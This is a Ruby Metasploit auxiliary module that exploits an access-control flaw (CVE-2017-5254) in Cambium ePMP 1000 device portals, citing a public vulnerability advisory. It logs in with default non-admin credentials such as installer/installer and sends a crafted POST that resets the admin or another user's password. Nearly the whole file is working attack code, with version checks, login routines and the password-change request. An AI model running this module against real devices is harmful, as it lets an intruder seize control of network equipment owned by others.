##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::EPMP

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Cambium ePMP 1000 Account Password Reset',
      'Description' => %{
          This module exploits an access control vulnerability in Cambium ePMP
          device management portal. It requires any one of the following non-admin login
          credentials - installer/installer, home/home - to reset password of other
          existing user(s) including 'admin'. All versions <=3.5 are affected. This
          module works on versions 3.0-3.5-RC7.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '2017-5254'],
          ['URL', 'https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),
        OptString.new('TARGET_USERNAME', [true, 'Target account - admin / installer / home / readonly', 'admin']),
        OptString.new('NEW_PASSWORD', [true, 'New Password for Target account', 'pass'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end
  end

  # Account Reset happens here
  def reset_pass(config_uri, cookie)
    pass_change_req = '{"device_props":{"' + "#{datastore['TARGET_USERNAME']}" + '_password' + '":"' + "#{datastore['NEW_PASSWORD']}" + '"},"template_props":{"config_id":"11"}}'

    print_status("#{rhost}:#{rport} - Changing password for #{datastore['TARGET_USERNAME']} to #{datastore['NEW_PASSWORD']}")

    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => config_uri,
        'cookie' => cookie,
        'headers' => {
          'Accept' => '*/*',
          'Accept-Language' => 'en-US,en;q=0.5',
          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With' => 'XMLHttpRequest',
          'Connection' => 'close'
        },
        'vars_post' =>
          {
            'changed_elements' => pass_change_req,
            'debug' => '0'
          }
      }, 25
    )

    good_response = (
      res &&
      res.code == 200 &&
      res.headers.include?('Content-Type') &&
      res.headers['Content-Type'].include?('application/json')&&
      res.body.include?('config_id')
    )

    if good_response
      print_good('Password successfully changed!')
    else
      print_error("#{rhost}:#{rport} - Failed to change password.")
    end
  end

  #
  # Login & initiate reset_pass
  #

  def do_login(epmp_ver)
    if (epmp_ver < '3.0' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')
      print_error('This module is applicable to versions 3.0-3.5-RC7 only. Exiting now.')
      return
    elsif (epmp_ver >= '3.0' && epmp_ver < '3.4.1') # <3.4.1 uses login_1
      cookie, _blah1, config_uri_reset_pass, _blah2 = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
      if cookie == 'skip' && config_uri_reset_pass == 'skip'
        return
      else
        reset_pass(config_uri_reset_pass, cookie)
      end
    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver)
      cookie, _blah1, config_uri_reset_pass, _blah2 = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
      if cookie == 'skip' && config_uri_reset_pass == 'skip'
        return
      else
        reset_pass(config_uri_reset_pass, cookie)
      end
    end
  end
end
